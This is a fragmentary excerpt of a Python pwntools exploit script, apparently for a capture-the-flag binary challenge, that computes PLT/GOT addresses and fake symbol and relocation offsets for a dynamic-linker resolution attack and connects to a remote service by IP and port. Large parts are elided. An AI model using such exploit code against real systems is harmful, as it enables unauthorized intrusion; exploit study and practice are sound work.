...
got_8=elf.get_section_by_name('.got.plt').header.sh_addr+8
...
fake_st_value=0xabc36-0x20740   								 #0x4526a   0xf02a4     0xf1147
fake_r_offset=0x3EC860 -0x20740
...
p = remote('39.100.119.37', 40480)
#gdb.attach(p, 'b* 0x4005a7')
...
print "base_stage ==> " + hex(base_stage)
...
#(1)确定各个节的地址 
plt_0 = 0x0000000000400490 # objdump -d -j .plt bof
plt_1 = plt_0+6
#(2)确定重定位下标
